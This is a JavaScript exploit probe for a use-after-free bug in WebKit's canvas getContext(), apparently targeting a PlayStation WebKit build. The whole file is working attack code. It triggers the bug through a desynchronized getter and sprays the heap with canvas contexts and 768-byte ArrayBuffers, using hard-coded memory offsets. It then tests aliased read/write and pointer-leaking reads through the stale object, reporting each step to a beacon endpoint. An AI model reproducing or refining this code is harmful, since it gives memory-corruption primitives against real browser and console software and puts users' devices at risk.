// p525 — Canvas getContext() UAF with corrected 768B spray
//
// Community corrections (issue #11, mja00 build of Sony WebKit_1400):
//   - USE_ISO_MALLOC=OFF on PlayStation → WTF_MAKE_ISO_ALLOCATED = WTF_MAKE_FAST_ALLOCATED
//   - CanvasRenderingContext2D = 712B → bmalloc 768B slot (class 67)
//   - m_canvas at context+0x20 (offset 32)
//   - Vector<State,1> m_stateStack at context+112 (16B header + 448B inline)
//   - State.lineWidth at State+48 → context+176
//   - State.lineDash at State+168 → context+296
//
// This probe tests:
//   T1: Feature detection (desynchronized getter, bitmaprenderer)
//   T2: UAF trigger + same-type 768B spray → aliased R/W
//   T3: UAF trigger + AB 768B spray → reclaim test (the IsoHeap question)
//   T4: If T3 works, getLineDash/lineWidth read through stale wrapper
//   T5: Double-canvas lineWidth leak (read m_canvas pointer area)
//
// Beacon prefix: V525-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V525-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // T1: Feature detection
  try {
    var tc = document.createElement('canvas');
    var features = [];

    // Check 2d
    var t2d = tc.getContext('2d');
    features.push('2d=' + !!t2d);

    // Check bitmaprenderer
    var tc2 = document.createElement('canvas');
    try {
      var tbr = tc2.getContext('bitmaprenderer');
      features.push('bitmaprenderer=' + !!tbr);
    } catch(e) { features.push('bitmaprenderer=err'); }

    // Check OffscreenCanvas
    features.push('offscreen=' + (typeof OffscreenCanvas !== 'undefined'));

    // Check desynchronized getter fires
    var getterFired = false;
    var tc3 = document.createElement('canvas');
    tc3.getContext('2d', {
      get desynchronized() { getterFired = true; return false; }
    });
    features.push('desyncGetter=' + getterFired);

    B('T1-FEATURES', features.join(' '));
  } catch(e) {
    B('T1-ERR', '' + e);
  }

  // T2: Same-type spray at 768B — aliased R/W
  setTimeout(function() {
    try {
      B('T2-START', 'same-type spray');

      var canvas = document.createElement('canvas');
      var innerCtx;

      // Trigger UAF
      var outerCtx = canvas.getContext('2d', {
        get desynchronized() {
          innerCtx = canvas.getContext('2d');
          return false;
        }
      });

      if (!innerCtx) {
        B('T2-DEAD', 'innerCtx null — getter did not fire');
        return;
      }

      B('T2-TRIGGERED', 'inner=' + !!innerCtx + ' outer=' + !!outerCtx +
        ' same=' + (innerCtx === outerCtx));

      // innerCtx is now dangling. outerCtx owns the canvas.
      // Spray same-type contexts to reclaim the freed 768B slot
      var sprayCanvases = [];
      var sprayCtxs = [];
      for (var i = 0; i < 200; i++) {
        var sc = document.createElement('canvas');
        sc.width = 1; sc.height = 1;
        var sctx = sc.getContext('2d');
        if (sctx) {
          sctx.lineWidth = 100 + i; // unique marker
          sprayCanvases.push(sc);
          sprayCtxs.push(sctx);
        }
      }
      B('T2-SPRAYED', 'n=' + sprayCtxs.length);

      // Check if innerCtx aliases any spray context
      var aliasIdx = -1;
      try {
        var testWidth = innerCtx.lineWidth;
        B('T2-READ', 'lineWidth=' + testWidth);

        for (var i = 0; i < sprayCtxs.length; i++) {
          if (sprayCtxs[i].lineWidth === testWidth && testWidth === (100 + i)) {
            aliasIdx = i;
            break;
          }
        }
      } catch(e) {
        B('T2-READ-ERR', '' + e);
      }

      if (aliasIdx >= 0) {
        B('T2-ALIAS', 'idx=' + aliasIdx);

        // Bidirectional write test
        try {
          innerCtx.lineWidth = 999.5;
          var readback = sprayCtxs[aliasIdx].lineWidth;
          B('T2-WRITETHRU', 'wrote=999.5 read=' + readback + ' match=' + (readback === 999.5));
        } catch(e) {
          B('T2-WRITETHRU-ERR', '' + e);
        }

        // Reverse direction
        try {
          sprayCtxs[aliasIdx].lineWidth = 777.25;
          var readback2 = innerCtx.lineWidth;
          B('T2-READTHRU', 'wrote=777.25 read=' + readback2 + ' match=' + (readback2 === 777.25));
        } catch(e) {
          B('T2-READTHRU-ERR', '' + e);
        }
      } else {
        B('T2-NOALIAS', 'lineWidth=' + testWidth + ' — no spray match');
      }

      B('T2-SURVIVED', 'alias=' + aliasIdx);

      // Clean up spray to free memory for T3
      sprayCanvases = null;
      sprayCtxs = null;
    } catch(e) {
      B('T2-ERR', '' + e);
    }
  }, 2000);

  // T3: ArrayBuffer spray at 768B — the IsoHeap question
  setTimeout(function() {
    try {
      B('T3-START', 'AB 768B spray — IsoHeap test');

      var canvas2 = document.createElement('canvas');
      var innerCtx2;

      var outerCtx2 = canvas2.getContext('2d', {
        get desynchronized() {
          innerCtx2 = canvas2.getContext('2d');
          return false;
        }
      });

      if (!innerCtx2) {
        B('T3-DEAD', 'innerCtx2 null');
        return;
      }

      B('T3-TRIGGERED', 'ok');

      // Spray ArrayBuffers at 768B to try to reclaim the freed context slot
      // bmalloc class 67 = 768B, so ABs of size 705-768 should land there
      // Key offsets (from mja00's compiled dump):
      //   m_stateStack Vector header at +112 (m_buffer ptr, m_size=4B, m_capacity=4B)
      //   Inline State[0] at +128
      //   State.lineWidth at State+48 = context+176
      //   State.lineDash at State+168 = context+296
      //   m_canvas at +32 (CanvasBase& ref stored as ptr)
      //
      // We write a known float64 at offset 176 so lineWidth reads our marker
      var MARKER_DOUBLE = 13.37;
      var markerBuf = new ArrayBuffer(8);
      var markerF64 = new Float64Array(markerBuf);
      var markerU8 = new Uint8Array(markerBuf);
      markerF64[0] = MARKER_DOUBLE;

      var abs = [];
      var views = [];
      for (var i = 0; i < 500; i++) {
        var ab = new ArrayBuffer(768);
        var v = new Uint8Array(ab);
        // Zero-fill first (safe for m_canvas — null deref instead of wild pointer)
        // Then write our marker double at offset 176 (lineWidth position)
        v[176] = markerU8[0];
        v[177] = markerU8[1];
        v[178] = markerU8[2];
        v[179] = markerU8[3];
        v[180] = markerU8[4];
        v[181] = markerU8[5];
        v[182] = markerU8[6];
        v[183] = markerU8[7];
        // Also put m_stateStack size=1 capacity=1 at offsets 120-127
        // so state() = m_stateStack.last() finds 1 element
        v[120] = 1; // m_size = 1 (little-endian uint32)
        v[124] = 1; // m_capacity = 1
        // m_buffer (offset 112) should point to offset 128 of this allocation
        // but we don't know the address, so leave it 0 and hope inline mode works
        abs.push(ab);
        views.push(v);
      }
      B('T3-SPRAYED', 'n=' + abs.length);

      // WK-1400 source confirms: lineWidth = state().lineWidth (pure inline read)
      // NO isContextLost(), NO canvasBase() dereference. Reads m_stateStack.last().lineWidth directly.
      // After AB reclaim, this reads our controlled bytes as a double.
      // State starts at context+128 (after Vector header at +112)
      // lineWidth is at State+48 → context+176 → AB byte offset 176
      try {
        var lw = innerCtx2.lineWidth;
        B('T3-LINEWIDTH', 'value=' + lw);

        // Extract raw bytes
        var buf = new ArrayBuffer(8);
        var f64 = new Float64Array(buf);
        var u8 = new Uint8Array(buf);
        f64[0] = lw;
        var bytes = [];
        for (var j = 0; j < 8; j++) bytes.push(('0' + u8[j].toString(16)).slice(-2));
        B('T3-LW-RAW', bytes.join(' '));

        // If lineWidth equals our marker pattern, AB reclaimed the context slot
        // AB[176..183] was filled with (i & 0xFF), check if the float matches
        // A repeated byte pattern like 0x0505050505050505 = a specific double
        if (lw !== 1.0 && lw !== 0) {
          B('T3-RECLAIMED', 'lineWidth is not default (1.0) — AB may have reclaimed slot');
        }
      } catch(e) {
        B('T3-LINEWIDTH-ERR', '' + e);
      }

      // Also try getLineDash — reads state().lineDash (Vector<double>)
      // lineDash is at State+168 → context+296
      // The Vector header (m_buffer ptr, m_size, m_capacity) will be our AB bytes
      try {
        var dash = innerCtx2.getLineDash();
        B('T3-GETLINEDASH', 'length=' + dash.length);
        if (dash.length > 0 && dash.length < 1000) {
          var vals = [];
          for (var d = 0; d < Math.min(dash.length, 8); d++) vals.push(dash[d]);
          B('T3-DASHVALS', vals.join(','));
        }
      } catch(e) {
        B('T3-GETLINEDASH-ERR', '' + e);
      }

      // Try globalAlpha — another double in State (should be at State+0 or nearby)
      try {
        var ga = innerCtx2.globalAlpha;
        B('T3-GLOBALALPHA', 'value=' + ga);
      } catch(e) {
        B('T3-GLOBALALPHA-ERR', '' + e);
      }

      B('T3-SURVIVED', 'AB spray did not crash');

      abs = null;
      views = null;
    } catch(e) {
      B('T3-ERR', '' + e);
    }
  }, 8000);

  // T4: Controlled AB spray — put valid-looking m_canvas at +0x20
  // This requires knowing a valid CanvasBase address, which we get from T2 aliasing
  setTimeout(function() {
    try {
      B('T4-START', 'controlled AB spray with canvas address');

      // Create a canvas that will persist (its HTMLCanvasElement is our target for m_canvas)
      var stableCanvas = document.createElement('canvas');
      document.body.appendChild(stableCanvas);
      var stableCtx = stableCanvas.getContext('2d');
      if (!stableCtx) {
        B('T4-DEAD', 'no stable context');
        return;
      }

      // Now trigger UAF on a DIFFERENT canvas
      var victimCanvas = document.createElement('canvas');
      var innerCtx3;

      var outerCtx3 = victimCanvas.getContext('2d', {
        get desynchronized() {
          innerCtx3 = victimCanvas.getContext('2d');
          // While in the getter, also do deferred saves on innerCtx3
          // to push state out-of-line (mja00's getLineDash primitive)
          innerCtx3.save();
          innerCtx3.lineWidth = 31.337; // marker in inline state
          innerCtx3.setLineDash([1.5, 2.5, 3.5, 4.5]); // puts a Vector<double> in state
          return false;
        }
      });

      if (!innerCtx3) {
        B('T4-DEAD', 'innerCtx3 null');
        return;
      }

      B('T4-TRIGGERED', 'ok — inner has save+lineWidth+lineDash set before free');

      // Same-type spray with 200 contexts
      var sprayC = [];
      var sprayX = [];
      for (var i = 0; i < 200; i++) {
        var sc = document.createElement('canvas');
        sc.width = 1; sc.height = 1;
        var sx = sc.getContext('2d');
        if (sx) {
          sx.lineWidth = 200 + i;
          sprayC.push(sc);
          sprayX.push(sx);
        }
      }

      // Read lineWidth through stale wrapper
      try {
        var lw = innerCtx3.lineWidth;
        B('T4-LINEWIDTH', 'value=' + lw);

        // Check alias
        for (var i = 0; i < sprayX.length; i++) {
          if (sprayX[i].lineWidth === lw && lw === (200 + i)) {
            B('T4-ALIAS', 'idx=' + i);

            // Try getLineDash through stale wrapper
            try {
              var dash = innerCtx3.getLineDash();
              B('T4-GETLINEDASH', 'length=' + dash.length +
                ' vals=' + Array.prototype.slice.call(dash, 0, 8).join(','));
            } catch(e) {
              B('T4-GETLINEDASH-ERR', '' + e);
            }

            // The spray context at aliasIdx has DEFAULT state (no lineDash set)
            // But innerCtx3 had lineDash [1.5,2.5,3.5,4.5] set BEFORE the free
            // If the spray context replaced it, its state is clean
            // Any non-empty getLineDash means we're reading stale/leaked state

            // Write a known lineWidth through alias, read via getLineDash
            try {
              innerCtx3.lineWidth = 42.42;
              var readSpray = sprayX[i].lineWidth;
              B('T4-BIDIR', 'wrote=42.42 readSpray=' + readSpray);
            } catch(e) {
              B('T4-BIDIR-ERR', '' + e);
            }

            break;
          }
        }
      } catch(e) {
        B('T4-LINEWIDTH-ERR', '' + e);
      }

      B('T4-SURVIVED', 'done');

      sprayC = null;
      sprayX = null;
    } catch(e) {
      B('T4-ERR', '' + e);
    }
  }, 14000);

  // T5: Double-free lineWidth float leak
  // Create aliased pair, then use Float64Array view to extract raw bytes
  // from lineWidth values to detect heap pointer patterns
  setTimeout(function() {
    try {
      B('T5-START', 'float byte extraction');

      var canvas5 = document.createElement('canvas');
      var inner5;

      var outer5 = canvas5.getContext('2d', {
        get desynchronized() {
          inner5 = canvas5.getContext('2d');
          return false;
        }
      });

      if (!inner5) { B('T5-DEAD', 'null'); return; }

      // Same-type spray
      var sp = [];
      var sx = [];
      for (var i = 0; i < 200; i++) {
        var c = document.createElement('canvas');
        c.width = 1; c.height = 1;
        var x = c.getContext('2d');
        if (x) { x.lineWidth = 300 + i; sp.push(c); sx.push(x); }
      }

      var lw = inner5.lineWidth;
      var aliasIdx = -1;
      for (var i = 0; i < sx.length; i++) {
        if (sx[i].lineWidth === lw && lw === (300 + i)) {
          aliasIdx = i;
          break;
        }
      }

      if (aliasIdx < 0) {
        B('T5-NOALIAS', 'lw=' + lw);
        return;
      }

      B('T5-ALIAS', 'idx=' + aliasIdx);

      // Use Float64Array + DataView to inspect raw bytes of state fields
      // Write a NaN-boxed value through lineWidth, read raw bytes
      var buf = new ArrayBuffer(8);
      var f64 = new Float64Array(buf);
      var u8 = new Uint8Array(buf);

      // Read current lineWidth raw bytes
      f64[0] = inner5.lineWidth;
      var bytes = [];
      for (var i = 0; i < 8; i++) bytes.push(u8[i]);
      B('T5-LWBYTES', bytes.map(function(b) {
        return ('0' + b.toString(16)).slice(-2);
      }).join(' '));

      // Now try reading globalAlpha (another float in State)
      try {
        f64[0] = inner5.globalAlpha;
        bytes = [];
        for (var i = 0; i < 8; i++) bytes.push(u8[i]);
        B('T5-ALPHABYTES', bytes.map(function(b) {
          return ('0' + b.toString(16)).slice(-2);
        }).join(' '));
      } catch(e) {
        B('T5-ALPHA-ERR', '' + e);
      }

      // Try reading shadowOffsetX/Y (more state fields)
      try {
        f64[0] = inner5.shadowOffsetX;
        bytes = [];
        for (var i = 0; i < 8; i++) bytes.push(u8[i]);
        B('T5-SHADOWX', bytes.map(function(b) {
          return ('0' + b.toString(16)).slice(-2);
        }).join(' '));
      } catch(e) {
        B('T5-SHADOW-ERR', '' + e);
      }

      // getLineDash through aliased context
      try {
        var dash = inner5.getLineDash();
        B('T5-DASH', 'length=' + dash.length);
        if (dash.length > 0) {
          var dashBytes = [];
          for (var d = 0; d < Math.min(dash.length, 4); d++) {
            f64[0] = dash[d];
            var db = [];
            for (var i = 0; i < 8; i++) db.push(('0' + u8[i].toString(16)).slice(-2));
            dashBytes.push(db.join(''));
          }
          B('T5-DASHRAW', dashBytes.join(' '));
        }
      } catch(e) {
        B('T5-DASH-ERR', '' + e);
      }

      B('T5-SURVIVED', 'done');
    } catch(e) {
      B('T5-ERR', '' + e);
    }
  }, 20000);

  // Final
  setTimeout(function() {
    B('COMPLETE', 'all T1-T5 done');
  }, 26000);

})();
